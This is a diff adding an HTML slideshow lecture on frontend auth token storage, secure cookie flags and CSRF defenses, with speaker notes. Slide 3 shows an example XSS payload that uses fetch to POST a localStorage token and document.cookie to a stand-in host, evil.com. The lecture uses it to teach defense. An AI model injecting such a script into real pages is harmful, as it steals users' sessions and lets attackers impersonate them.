@@ -1,0 +1,416 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Part 6: Authentication &amp; Token Security</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #f3f4f6; }
+    .slideshow { height: 100vh; display: flex; flex-direction: column; }
+    .slide-container { flex: 1; display: flex; align-items: center; justify-content: center; padding: 2rem; }
+    .slide { background: white; border-radius: 1rem; box-shadow: 0 10px 40px rgba(0,0,0,0.1); width: 100%; max-width: 1000px; height: 600px; padding: 3rem; display: none; flex-direction: column; }
+    .slide.active { display: flex; }
+    .controls { background: white; border-top: 1px solid #e5e7eb; padding: 1rem 2rem; display: flex; justify-content: space-between; align-items: center; }
+    .btn { padding: 0.5rem 1.5rem; border: none; border-radius: 0.5rem; font-size: 1rem; cursor: pointer; display: flex; align-items: center; gap: 0.5rem; }
+    .btn-prev, .btn-next { background: #0891b2; color: white; }
+    .btn:disabled { background: #d1d5db; cursor: not-allowed; }
+    .dots { display: flex; gap: 0.5rem; }
+    .dot { width: 10px; height: 10px; border-radius: 50%; background: #d1d5db; border: none; cursor: pointer; }
+    .dot.active { background: #0891b2; width: 20px; border-radius: 5px; }
+    .slide-title { display: flex; align-items: center; gap: 1rem; margin-bottom: 2rem; }
+    .icon { width: 50px; height: 50px; border-radius: 0.75rem; display: flex; align-items: center; justify-content: center; font-size: 1.1rem; font-weight: bold; }
+    .icon-red { background: #fef2f2; color: #dc2626; }
+    .icon-orange { background: #ffedd5; color: #c2410c; }
+    .icon-blue { background: #dbeafe; color: #1d4ed8; }
+    .icon-green { background: #dcfce7; color: #15803d; }
+    .icon-yellow { background: #fef3c7; color: #b45309; }
+    .icon-purple { background: #f3e8ff; color: #7c3aed; }
+    .icon-cyan { background: #cffafe; color: #0891b2; }
+    h1 { font-size: 2.5rem; color: #1f2937; }
+    h2 { font-size: 1.75rem; color: #1f2937; }
+    h3 { font-size: 1.25rem; color: #374151; margin-bottom: 0.5rem; }
+    .subtitle { color: #6b7280; font-size: 1.1rem; }
+    .content { flex: 1; display: flex; flex-direction: column; gap: 1rem; }
+    .card { background: #f9fafb; border-radius: 0.75rem; padding: 1.25rem; }
+    .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 1.5rem; flex: 1; }
+    .grid-3 { display: grid; grid-template-columns: repeat(3, 1fr); gap: 1rem; flex: 1; }
+    .title-slide { align-items: center; justify-content: center; text-align: center; }
+    .title-slide .icon { width: 80px; height: 80px; font-size: 1.5rem; margin-bottom: 1.5rem; border-radius: 50%; }
+    .title-slide h1 { margin-bottom: 1rem; }
+    .title-slide .subtitle { margin-bottom: 1.5rem; font-size: 1.25rem; }
+    .badge { background: #cffafe; color: #0891b2; padding: 0.5rem 1rem; border-radius: 2rem; font-size: 0.9rem; }
+    .counter { color: #6b7280; font-size: 0.9rem; }
+    pre { background: #1f2937; color: #f9fafb; padding: 1.25rem; border-radius: 0.5rem; font-size: 0.85rem; overflow-x: auto; font-family: 'Monaco', 'Menlo', monospace; line-height: 1.5; }
+    code { font-family: 'Monaco', 'Menlo', monospace; }
+    .code-inline { background: #f3f4f6; padding: 0.2rem 0.5rem; border-radius: 0.25rem; font-size: 0.85rem; color: #0891b2; font-family: 'Monaco', 'Menlo', monospace; }
+    .list-card { border-radius: 0.75rem; padding: 1.5rem; }
+    .list-card-cyan { background: #cffafe; border: 1px solid #67e8f9; }
+    .list-card-red { background: #fef2f2; border: 1px solid #fca5a5; }
+    .list-card ul { list-style: none; }
+    .list-card li { padding: 0.5rem 0; display: flex; align-items: flex-start; gap: 0.5rem; color: #374151; }
+    .check { color: #0891b2; font-weight: bold; }
+    .highlight-box { background: #cffafe; border: 2px solid #67e8f9; border-radius: 0.75rem; padding: 1.5rem; margin-top: 1rem; }
+    .highlight-box p { color: #0891b2; font-weight: 500; font-size: 1.1rem; }
+    .flow-diagram { display: flex; align-items: center; justify-content: center; gap: 0.75rem; margin: 1rem 0; flex-wrap: wrap; }
+    .flow-box { padding: 0.75rem 1.25rem; border-radius: 0.5rem; text-align: center; font-weight: 500; font-size: 0.9rem; }
+    .flow-arrow { font-size: 1.5rem; color: #0891b2; }
+    .comparison-table { width: 100%; border-collapse: collapse; font-size: 0.85rem; }
+    .comparison-table th, .comparison-table td { padding: 0.6rem 0.75rem; text-align: left; border-bottom: 1px solid #e5e7eb; }
+    .comparison-table th { background: #f9fafb; color: #374151; font-weight: 600; }
+    .notes { display: none; }
+    .notes-panel { display: none; background: #1f2937; color: #f9fafb; padding: 1.5rem 2rem; font-size: 0.95rem; line-height: 1.6; border-top: 3px solid #0891b2; max-height: 200px; overflow-y: auto; }
+    .notes-panel.visible { display: block; }
+    .notes-panel strong { color: #67e8f9; }
+  </style>
+</head>
+<body>
+  <main class="slideshow">
+    <div class="slide-container" role="region" aria-label="Slide presentation">
+
+      <!-- Slide 1: Title -->
+      <section class="slide active title-slide" aria-label="Title slide">
+        <div class="icon icon-cyan" aria-hidden="true">AUTH</div>
+        <h1>Part 6: Auth &amp; Token Security</h1>
+        <p class="subtitle">Where to Store Tokens &amp; How to Protect Sessions</p>
+        <span class="badge">10 Minutes</span>
+        <div class="notes">
+          <strong>Speaker Notes:</strong> "We're going to wrap up with one of the most practical topics: where should you store authentication tokens in a frontend app? This is a decision you'll make on every app that has user login." This ties together everything we've learned today: XSS determines where tokens are safe, CORS affects how tokens are sent, and the Same-Origin Policy is the underlying security model.
+        </div>
+      </section>
+
+      <!-- Slide 2: The Three Options -->
+      <section class="slide" aria-label="Where to store auth tokens">
+        <header class="slide-title">
+          <div class="icon icon-cyan" aria-hidden="true">?</div>
+          <div><h2>Where to Store Auth Tokens?</h2><p class="subtitle">The Three Client-Side Options</p></div>
+        </header>
+        <div class="content">
+          <div class="grid-3">
+            <div class="card" style="background: #fef2f2; border: 1px solid #fca5a5;">
+              <h3 style="color: #dc2626; font-size: 1.1rem;">localStorage</h3>
+              <pre style="font-size: 0.75rem; padding: 0.75rem; margin-bottom: 0.75rem;">
+localStorage.setItem(
+  <span style="color:#a5f3fc">'token'</span>,
+  <span style="color:#a5f3fc">'eyJhbG...'</span>
+);
+
+<span style="color:#6b7280">// Read it back</span>
+localStorage.getItem(<span style="color:#a5f3fc">'token'</span>);</pre>
+              <ul style="font-size: 0.8rem; color: #374151; list-style: none;">
+                <li style="padding: 0.2rem 0;">&#10003; Persists across tabs &amp; sessions</li>
+                <li style="padding: 0.2rem 0;">&#10003; 5-10 MB storage</li>
+                <li style="padding: 0.2rem 0; color: #dc2626;">&#10007; Accessible to ANY JavaScript</li>
+                <li style="padding: 0.2rem 0; color: #dc2626;">&#10007; XSS can steal tokens!</li>
+              </ul>
+            </div>
+            <div class="card" style="background: #fef3c7; border: 1px solid #fcd34d;">
+              <h3 style="color: #b45309; font-size: 1.1rem;">sessionStorage</h3>
+              <pre style="font-size: 0.75rem; padding: 0.75rem; margin-bottom: 0.75rem;">
+sessionStorage.setItem(
+  <span style="color:#a5f3fc">'token'</span>,
+  <span style="color:#a5f3fc">'eyJhbG...'</span>
+);
+
+<span style="color:#6b7280">// Cleared when tab closes</span></pre>
+              <ul style="font-size: 0.8rem; color: #374151; list-style: none;">
+                <li style="padding: 0.2rem 0;">&#10003; Cleared when tab closes</li>
+                <li style="padding: 0.2rem 0;">&#10003; Per-tab isolation</li>
+                <li style="padding: 0.2rem 0; color: #dc2626;">&#10007; Still accessible to JS</li>
+                <li style="padding: 0.2rem 0; color: #dc2626;">&#10007; XSS can still steal tokens!</li>
+              </ul>
+            </div>
+            <div class="card" style="background: #dcfce7; border: 1px solid #86efac;">
+              <h3 style="color: #15803d; font-size: 1.1rem;">HttpOnly Cookies</h3>
+              <pre style="font-size: 0.75rem; padding: 0.75rem; margin-bottom: 0.75rem;">
+<span style="color:#6b7280">// Set by server header:</span>
+Set-Cookie: token=eyJhbG...;
+  HttpOnly; Secure; SameSite=Strict
+
+<span style="color:#6b7280">// JS cannot access this!</span></pre>
+              <ul style="font-size: 0.8rem; color: #374151; list-style: none;">
+                <li style="padding: 0.2rem 0;">&#10003; JS cannot read or modify</li>
+                <li style="padding: 0.2rem 0;">&#10003; Sent automatically with requests</li>
+                <li style="padding: 0.2rem 0;">&#10003; XSS cannot steal the token!</li>
+                <li style="padding: 0.2rem 0; color: #b45309;">&#9888; Vulnerable to CSRF (fixable)</li>
+              </ul>
+            </div>
+          </div>
+          <div class="highlight-box">
+            <p style="text-align: center; font-size: 1rem;"><strong>Rule of thumb:</strong> HttpOnly cookies are the most secure for auth tokens. localStorage is convenient but XSS-vulnerable.</p>
+          </div>
+        </div>
+        <div class="notes">
+          <strong>Speaker Notes:</strong> Walk through each option. localStorage: "Easy to use, but ANY JavaScript on the page can read it. Remember XSS? If an attacker injects one line of code, they run document.cookie or localStorage.getItem('token') and send your token to their server." sessionStorage: "Slightly better because it's cleared when the tab closes, but still readable by JS." HttpOnly cookies: "The server sets the cookie with the HttpOnly flag, which means JavaScript CANNOT access it. Even if XSS happens, the attacker can't read the cookie." <strong>DEMO:</strong> Open DevTools Application tab, show localStorage, sessionStorage, and Cookies sections. Show how localStorage values are readable but HttpOnly cookies are not accessible via document.cookie.
+        </div>
+      </section>
+
+      <!-- Slide 3: XSS + localStorage -->
+      <section class="slide" aria-label="XSS plus localStorage attack">
+        <header class="slide-title">
+          <div class="icon icon-red" aria-hidden="true">!</div>
+          <div><h2>The XSS + localStorage Problem</h2><p class="subtitle">One Line of Code Steals Your Token</p></div>
+        </header>
+        <div class="content">
+          <div class="grid-2">
+            <div>
+              <h3 style="color: #dc2626;">The Attack</h3>
+              <pre style="font-size: 0.8rem; margin-bottom: 1rem;">
+<span style="color:#6b7280">// If XSS exists on your page...</span>
+<span style="color:#6b7280">// Attacker injects this script:</span>
+
+<span style="color:#fca5a5">fetch('https://evil.com/steal', {</span>
+<span style="color:#fca5a5">  method: 'POST',</span>
+<span style="color:#fca5a5">  body: JSON.stringify({</span>
+<span style="color:#fca5a5">    token: localStorage.getItem('token'),</span>
+<span style="color:#fca5a5">    cookies: document.cookie</span>
+<span style="color:#fca5a5">  })</span>
+<span style="color:#fca5a5">})</span>
+
+<span style="color:#6b7280">// That's it. One request.</span>
+<span style="color:#6b7280">// Attacker now has your auth token</span>
+<span style="color:#6b7280">// and can impersonate you.</span></pre>
+            </div>
+            <div>
+              <h3 style="color: #15803d;">With HttpOnly Cookies</h3>
+              <pre style="font-size: 0.8rem; margin-bottom: 1rem;">
+<span style="color:#6b7280">// Same XSS attack, but...</span>
+
+localStorage.getItem(<span style="color:#a5f3fc">'token'</span>)
+<span style="color:#86efac">// Returns: null (nothing there)</span>
+
+document.cookie
+<span style="color:#86efac">// Returns: "" (HttpOnly cookies</span>
+<span style="color:#86efac">// are invisible to JavaScript!)</span>
+
+<span style="color:#6b7280">// Attacker can still make requests</span>
+<span style="color:#6b7280">// FROM the page (session riding),</span>
+<span style="color:#6b7280">// but can't STEAL the token itself</span>
+<span style="color:#6b7280">// to use from another machine.</span></pre>
+              <div class="card" style="background: #dcfce7; border: 1px solid #86efac;">
+                <p style="font-size: 0.85rem; color: #15803d;"><strong>HttpOnly cookies are a damage limitation strategy.</strong> XSS is still bad, but the attacker can't exfiltrate the token.</p>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="notes">
+          <strong>Speaker Notes:</strong> Side-by-side comparison. "On the left, with localStorage, the attacker can grab your token and send it to their server. Now they can log in as you from THEIR computer, at any time, until the token expires." "On the right, with HttpOnly cookies, the token is invisible to JavaScript. The attacker can still do damage if they have XSS (they can make requests from the page), but they can't steal the token and use it from their own machine. This is 'damage limitation.'" Key teaching moment: "This is why we talked about defense in depth earlier. Prevent XSS first (React auto-escaping, CSP). But if XSS happens anyway, HttpOnly cookies limit the damage."
+        </div>
+      </section>
+
+      <!-- Slide 4: Secure Cookie Flags -->
+      <section class="slide" aria-label="Secure cookie flags">
+        <header class="slide-title">
+          <div class="icon icon-cyan" aria-hidden="true">SET</div>
+          <div><h2>Secure Cookie Flags</h2><p class="subtitle">Three Flags That Make Cookies Safe</p></div>
+        </header>
+        <div class="content">
+          <pre style="font-size: 0.9rem; margin-bottom: 1.5rem;">
+Set-Cookie: session=abc123; <span style="color:#67e8f9">HttpOnly</span>; <span style="color:#86efac">Secure</span>; <span style="color:#c4b5fd">SameSite=Strict</span></pre>
+          <div class="grid-3">
+            <div class="card" style="background: #cffafe; border: 1px solid #67e8f9;">
+              <h3 style="color: #0891b2; font-size: 1.1rem;">HttpOnly</h3>
+              <p style="font-size: 0.85rem; color: #374151; margin-bottom: 0.5rem;"><strong>JavaScript cannot access this cookie.</strong></p>
+              <p style="font-size: 0.8rem; color: #374151;">document.cookie won't show it. Protects against XSS token theft.</p>
+              <p style="font-size: 0.8rem; color: #0891b2; margin-top: 0.5rem; font-weight: 600;">Prevents: XSS token theft</p>
+            </div>
+            <div class="card" style="background: #dcfce7; border: 1px solid #86efac;">
+              <h3 style="color: #15803d; font-size: 1.1rem;">Secure</h3>
+              <p style="font-size: 0.85rem; color: #374151; margin-bottom: 0.5rem;"><strong>Only sent over HTTPS.</strong></p>
+              <p style="font-size: 0.8rem; color: #374151;">Won't be sent on HTTP connections, preventing interception on insecure networks.</p>
+              <p style="font-size: 0.8rem; color: #15803d; margin-top: 0.5rem; font-weight: 600;">Prevents: Network sniffing</p>
+            </div>
+            <div class="card" style="background: #f3e8ff; border: 1px solid #c4b5fd;">
+              <h3 style="color: #7c3aed; font-size: 1.1rem;">SameSite</h3>
+              <p style="font-size: 0.85rem; color: #374151; margin-bottom: 0.5rem;"><strong>Controls cross-site sending.</strong></p>
+              <ul style="font-size: 0.8rem; color: #374151; list-style: none;">
+                <li><strong>Strict:</strong> Never sent cross-site</li>
+                <li><strong>Lax:</strong> Sent on top-level navigations</li>
+                <li><strong>None:</strong> Always sent (requires Secure)</li>
+              </ul>
+              <p style="font-size: 0.8rem; color: #7c3aed; margin-top: 0.5rem; font-weight: 600;">Prevents: CSRF attacks</p>
+            </div>
+          </div>
+          <div class="highlight-box">
+            <p style="text-align: center; font-size: 1rem;">Use all three together: <span style="font-family: monospace;">HttpOnly; Secure; SameSite=Lax</span> is the recommended baseline.</p>
+          </div>
+        </div>
+        <div class="notes">
+          <strong>Speaker Notes:</strong> Show the Set-Cookie header syntax. "These are three independent flags, and you should use all three." HttpOnly: "We just covered this &mdash; blocks JS access." Secure: "Remember Week 8 when we talked about HTTPS? The Secure flag means this cookie is ONLY sent over HTTPS. On plain HTTP, the browser won't include it, so even if someone intercepts traffic on coffee shop Wi-Fi, they won't get the cookie." SameSite: "This is the newest flag and it prevents CSRF attacks." Explain CSRF briefly: "An attacker's site tricks your browser into making a request to bank.com. Since your browser automatically sends cookies with requests to bank.com, the request carries your session. SameSite=Strict prevents this by not sending the cookie on cross-site requests." Lax is a good default &mdash; it allows the cookie on top-level navigations (clicking a link) but blocks it on cross-site form submissions and fetch requests.
+        </div>
+      </section>
+
+      <!-- Slide 5: CSRF Quick Explainer -->
+      <section class="slide" aria-label="CSRF attacks explained">
+        <header class="slide-title">
+          <div class="icon icon-red" aria-hidden="true">CSRF</div>
+          <div><h2>CSRF: Cross-Site Request Forgery</h2><p class="subtitle">When Other Sites Make Requests As You</p></div>
+        </header>
+        <div class="content">
+          <div class="grid-2">
+            <div>
+              <h3>The Attack</h3>
+              <div class="flow-diagram" style="flex-direction: column; gap: 0.4rem; align-items: stretch;">
+                <div class="flow-box" style="background: #dcfce7; color: #15803d; font-size: 0.85rem;">1. You're logged into bank.com (cookie active)</div>
+                <span class="flow-arrow" style="text-align: center;">&#8595;</span>
+                <div class="flow-box" style="background: #fef2f2; color: #dc2626; font-size: 0.85rem;">2. You visit evil.com (in another tab)</div>
+                <span class="flow-arrow" style="text-align: center;">&#8595;</span>
+                <div class="flow-box" style="background: #fef2f2; color: #dc2626; font-size: 0.85rem;">3. evil.com has a hidden form that submits to bank.com/transfer</div>
+                <span class="flow-arrow" style="text-align: center;">&#8595;</span>
+                <div class="flow-box" style="background: #ffedd5; color: #c2410c; font-size: 0.85rem;">4. Browser automatically sends your bank.com cookie</div>
+                <span class="flow-arrow" style="text-align: center;">&#8595;</span>
+                <div class="flow-box" style="background: #fef2f2; color: #dc2626; font-size: 0.85rem;">5. Bank processes request as YOU</div>
+              </div>
+            </div>
+            <div>
+              <h3>The Defenses</h3>
+              <div class="card" style="background: #dcfce7; border: 1px solid #86efac; margin-bottom: 0.75rem;">
+                <h3 style="color: #15803d; font-size: 1rem;">1. SameSite Cookies (Easiest)</h3>
+                <p style="font-size: 0.85rem; color: #374151;"><span class="code-inline" style="color: #15803d;">SameSite=Lax</span> or <span class="code-inline" style="color: #15803d;">Strict</span> prevents the cookie from being sent on cross-site requests. Modern default in Chrome.</p>
+              </div>
+              <div class="card" style="background: #dbeafe; border: 1px solid #93c5fd; margin-bottom: 0.75rem;">
+                <h3 style="color: #1d4ed8; font-size: 1rem;">2. CSRF Tokens</h3>
+                <p style="font-size: 0.85rem; color: #374151;">Server sends a random token with each page. Forms must include this token. Attacker can't guess it.</p>
+              </div>
+              <div class="card" style="background: #f3e8ff; border: 1px solid #c4b5fd;">
+                <h3 style="color: #7c3aed; font-size: 1rem;">3. Check Origin/Referer Header</h3>
+                <p style="font-size: 0.85rem; color: #374151;">Server verifies the Origin header matches its own domain. Requests from evil.com show Origin: evil.com.</p>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="notes">
+          <strong>Speaker Notes:</strong> CSRF is the trade-off of using cookies. "Cookies are automatically sent with every request to their domain. That's convenient for auth, but it means OTHER sites can trigger requests that carry your cookies." Walk through the attack: "You're logged into your bank. You visit a malicious site. That site has a hidden form that submits to bank.com/transfer?to=attacker&amount=1000. Your browser sends the bank.com cookies automatically." Good news: "SameSite=Lax is now the DEFAULT in Chrome and most browsers, so CSRF is much less common than it used to be. But you should still understand it." For React SPAs: "If you're using fetch() with JSON APIs, CSRF is largely mitigated because: (1) SameSite cookies block cross-origin requests, (2) JSON Content-Type triggers CORS preflight, and (3) the Origin header is checked."
+        </div>
+      </section>
+
+      <!-- Slide 6: Best Practices Summary -->
+      <section class="slide" aria-label="Auth best practices">
+        <header class="slide-title">
+          <div class="icon icon-green" aria-hidden="true">BEST</div>
+          <div><h2>Authentication Best Practices</h2><p class="subtitle">The Rules for Your Projects</p></div>
+        </header>
+        <div class="content">
+          <div class="grid-2">
+            <div>
+              <div class="card" style="background: #dcfce7; border: 1px solid #86efac; margin-bottom: 0.75rem;">
+                <h3 style="color: #15803d; font-size: 1rem;">Do</h3>
+                <ul style="font-size: 0.85rem; color: #374151; list-style: none;">
+                  <li style="padding: 0.3rem 0;">&#10003; Use HttpOnly cookies for session tokens</li>
+                  <li style="padding: 0.3rem 0;">&#10003; Set Secure and SameSite flags</li>
+                  <li style="padding: 0.3rem 0;">&#10003; Use short expiration times</li>
+                  <li style="padding: 0.3rem 0;">&#10003; Implement token refresh mechanisms</li>
+                  <li style="padding: 0.3rem 0;">&#10003; Invalidate sessions on logout (server-side)</li>
+                  <li style="padding: 0.3rem 0;">&#10003; Use established auth libraries (NextAuth, Passport)</li>
+                </ul>
+              </div>
+            </div>
+            <div>
+              <div class="card" style="background: #fef2f2; border: 1px solid #fca5a5; margin-bottom: 0.75rem;">
+                <h3 style="color: #dc2626; font-size: 1rem;">Don't</h3>
+                <ul style="font-size: 0.85rem; color: #374151; list-style: none;">
+                  <li style="padding: 0.3rem 0;">&#10007; Store sensitive tokens in localStorage</li>
+                  <li style="padding: 0.3rem 0;">&#10007; Build your own auth system from scratch</li>
+                  <li style="padding: 0.3rem 0;">&#10007; Store passwords in frontend code</li>
+                  <li style="padding: 0.3rem 0;">&#10007; Use tokens that never expire</li>
+                  <li style="padding: 0.3rem 0;">&#10007; Forget to invalidate sessions on logout</li>
+                  <li style="padding: 0.3rem 0;">&#10007; Send tokens in URL query parameters</li>
+                </ul>
+              </div>
+            </div>
+          </div>
+          <div class="highlight-box" style="background: #cffafe; border-color: #67e8f9;">
+            <p style="color: #0891b2; text-align: center; font-size: 1rem;"><strong>Golden Rule:</strong> Never roll your own auth. Use battle-tested libraries and services (Auth0, Firebase Auth, NextAuth.js, Supabase Auth).</p>
+          </div>
+        </div>
+        <div class="notes">
+          <strong>Speaker Notes:</strong> "The single most important piece of advice: don't build authentication from scratch. It's one of the hardest things to get right in software." Walk through the Do list: "Use HttpOnly cookies. Set all the flags we discussed. Use short expiration times so even if a token leaks, it's only valid for a limited time." Walk through the Don't list: "Never store sensitive tokens in localStorage. Never put tokens in URLs (they show up in server logs, browser history, and the Referer header). And PLEASE don't try to build your own auth system for your final projects &mdash; use a library." Mention specific tools they might use: NextAuth.js (if using Next.js), Firebase Auth, Supabase Auth, Auth0.
+        </div>
+      </section>
+
+      <!-- Slide 7: Week Summary -->
+      <section class="slide" aria-label="Week 9 complete">
+        <header class="slide-title">
+          <div class="icon icon-red" aria-hidden="true">&#10003;</div>
+          <div><h2>Week 9 Complete!</h2><p class="subtitle">Web Security for Frontend Developers</p></div>
+        </header>
+        <div class="content" style="justify-content: center;">
+          <div class="list-card list-card-red">
+            <ul style="font-size: 1rem;">
+              <li><span class="check" style="color: #dc2626;">&#10003;</span> <strong>OWASP Top 10</strong> &mdash; the industry-standard security checklist</li>
+              <li><span class="check" style="color: #dc2626;">&#10003;</span> <strong>XSS</strong> &mdash; stored, reflected, DOM-based; React auto-escaping</li>
+              <li><span class="check" style="color: #dc2626;">&#10003;</span> <strong>CSP</strong> &mdash; HTTP headers that block unauthorized scripts</li>
+              <li><span class="check" style="color: #dc2626;">&#10003;</span> <strong>CORS</strong> &mdash; Same-Origin Policy, preflight, fixing errors</li>
+              <li><span class="check" style="color: #dc2626;">&#10003;</span> <strong>Secrets</strong> &mdash; frontend code is public; .env is not secret</li>
+              <li><span class="check" style="color: #dc2626;">&#10003;</span> <strong>Auth Tokens</strong> &mdash; HttpOnly cookies, SameSite, CSRF</li>
+            </ul>
+          </div>
+          <div class="highlight-box" style="background: #fef2f2; border-color: #fca5a5;">
+            <p style="color: #dc2626; text-align: center;">Security is not a feature you add later &mdash; it's a mindset you build from the start.</p>
+          </div>
+        </div>
+        <div class="notes">
+          <strong>Speaker Notes:</strong> Final recap. "Today we covered the six most important web security topics for frontend developers. You now know more about web security than most junior developers." Reiterate the key takeaway: "Security isn't something you bolt on at the end. It starts with how you write your code: using textContent instead of innerHTML, not putting secrets in frontend code, being careful with npm packages, and using proper cookie flags." Challenge: "For your next project, try to add a CSP meta tag and make sure you're not putting any secrets in your frontend code." If time allows, take questions. Common follow-up questions: "What about JWT vs session cookies?" (Both valid, JWTs are stateless but harder to revoke.) "What about OAuth?" (OAuth is an authorization framework, not authentication &mdash; but services like Auth0 build on it.)
+        </div>
+      </section>
+
+    </div>
+
+    <div class="notes-panel" id="notesPanel"></div>
+
+    <nav class="controls" aria-label="Slide navigation">
+      <button class="btn btn-prev" onclick="prevSlide()" aria-label="Previous slide">&#8592; Previous</button>
+      <div class="dots" id="dots" role="tablist" aria-label="Slide indicators"></div>
+      <div style="display:flex;align-items:center;gap:1rem">
+        <span class="counter" id="counter" aria-live="polite">1 / 7</span>
+        <button class="btn btn-next" onclick="nextSlide()" aria-label="Next slide">Next &#8594;</button>
+      </div>
+    </nav>
+  </main>
+
+  <script>
+    const slides = document.querySelectorAll('.slide');
+    const dotsContainer = document.getElementById('dots');
+    const counter = document.getElementById('counter');
+    const notesPanel = document.getElementById('notesPanel');
+    let current = 0;
+    let notesVisible = false;
+    slides.forEach((_, i) => {
+      const dot = document.createElement('button');
+      dot.className = 'dot' + (i === 0 ? ' active' : '');
+      dot.onclick = () => goToSlide(i);
+      dot.setAttribute('aria-label', 'Go to slide ' + (i + 1));
+      dotsContainer.appendChild(dot);
+    });
+    function updateNotes() {
+      const currentSlide = slides[current];
+      const notes = currentSlide.querySelector('.notes');
+      if (notes) {
+        notesPanel.innerHTML = notes.innerHTML;
+      } else {
+        notesPanel.innerHTML = '<strong>No notes for this slide.</strong>';
+      }
+    }
+    function updateSlide() {
+      slides.forEach((s, i) => s.classList.toggle('active', i === current));
+      document.querySelectorAll('.dot').forEach((d, i) => d.classList.toggle('active', i === current));
+      counter.textContent = `${current + 1} / ${slides.length}`;
+      document.querySelector('.btn-prev').disabled = current === 0;
+      document.querySelector('.btn-next').disabled = current === slides.length - 1;
+      if (notesVisible) updateNotes();
+    }
+    function nextSlide() { if (current < slides.length - 1) { current++; updateSlide(); } }
+    function prevSlide() { if (current > 0) { current--; updateSlide(); } }
+    function goToSlide(i) { current = i; updateSlide(); }
+    document.addEventListener('keydown', (e) => {
+      if (e.key === 'ArrowRight' || e.key === ' ') nextSlide();
+      if (e.key === 'ArrowLeft') prevSlide();
+      if (e.key === 'n' || e.key === 'N') {
+        notesVisible = !notesVisible;
+        notesPanel.classList.toggle('visible', notesVisible);
+        if (notesVisible) updateNotes();
+      }
+    });
+  </script>
+</body>
+</html>
